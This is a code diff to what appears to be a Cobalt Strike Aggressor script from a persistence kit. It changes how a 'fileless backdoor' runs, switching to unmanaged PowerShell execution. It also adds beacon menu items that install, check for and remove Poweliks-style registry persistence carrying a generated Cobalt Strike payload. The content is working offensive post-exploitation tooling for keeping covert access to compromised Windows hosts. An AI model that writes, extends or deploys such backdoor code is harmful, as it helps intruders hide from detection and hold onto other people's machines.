@@ -33,7 +33,7 @@ sub createFilelessBackdoor{
 	binput($bid, "powershell-import Persist-Poweliks.ps1");
 	bpowershell_import($bid, script_resource("PersistKit/scripts/Persist-Poweliks.ps1"));
 	binput($bid, "powershell Persist-Poweliks");
-	bpowershell($bid, "Persist-Poweliks -cobaltstrike_gen_payload \" $+ $psPayload $+ \"");
+	bpowerpick($bid, "Persist-Poweliks -cobaltstrike_gen_payload \" $+ $psPayload $+ \"");
 }
 
 # Returns a string to use for the reg key name
@@ -84,12 +84,28 @@ popup beacon_bottom {
 				}, $bid => $1));
 			}
 		}
-		item "Create fileless backdoor"{
-			local('$bid');
-			foreach $bid ($1){
-				openPayloadHelper(lambda({
-					createFilelessBackdoor($bid, $1);
-					}, $bid => $1));
+		menu "Fileless backdoor" {
+			item "Create fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					openPayloadHelper(lambda({
+						createFilelessBackdoor($bid, $1);
+						}, $bid => $1));
+				}
+			}
+			item "Check for fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					bpowershell_import($bid, script_resource("PersistKit/scripts/Persist-Poweliks.ps1"));
+					bpowershell($bid, "Test-Poweliks");
+				}
+			}
+			item "Remove fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					bpowershell_import($bid, script_resource("PersistKit/scripts/Persist-Poweliks.ps1"));
+					bpowershell($bid, "Remove-Poweliks");
+				}
 			}
 		}
 	}
